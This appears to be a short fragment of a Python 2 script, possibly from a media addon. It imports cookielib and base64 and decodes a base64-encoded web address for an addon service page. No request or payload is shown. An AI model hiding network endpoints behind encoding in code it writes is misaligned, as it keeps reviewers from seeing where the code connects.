import cookielib,base64

a=base64.b64decode("aHR0cDovL3N0ZWZhbm9hZGRvbi5pbmZvL2FkZG9ubXVsdGkvc2VydmljZS5odG1s")